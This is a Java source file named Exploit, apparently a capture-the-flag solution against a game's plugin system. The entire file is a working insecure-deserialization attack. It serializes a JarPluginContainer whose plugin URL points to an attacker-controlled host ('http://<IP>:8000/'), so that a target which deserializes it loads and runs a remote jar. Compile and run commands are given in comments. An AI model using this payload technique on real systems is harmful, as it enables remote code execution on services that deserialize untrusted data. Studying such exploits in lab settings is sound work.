import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.io.IOException;
import java.net.MalformedURLException;

import java.net.URL;

import org.hallebarde.recrutement.plugins.JarPluginContainer;
import org.hallebarde.recrutement.api.PluginMetadata;

// javac -cp '.:game.jar' Exploit.java
// java -cp '.:game.jar' Exploit
public class Exploit {
    private static void writePluginToFile(String filename, JarPluginContainer container){
        try{
            FileOutputStream file = new FileOutputStream(filename);
            ObjectOutputStream out = new ObjectOutputStream(file);

            out.writeObject(container);

            out.close();
            file.close();

            System.out.println("[*] Object serialized to " + filename);
        } catch (IOException ioex){
            System.out.println("[x] Error when serializing: " + ioex);
        }
    }

    public static void main(String[] args){
        try {
            PluginMetadata meta = new PluginMetadata("injected", "Payload", "0.1");
            URL url = new URL("http://<IP>:8000/");
    
    
            JarPluginContainer jpc = new JarPluginContainer(meta, url, true);
    
            writePluginToFile("JarPluginContainer.ser", jpc);
        }catch(MalformedURLException e){
            System.out.println("urg bad url");
        }
    }
}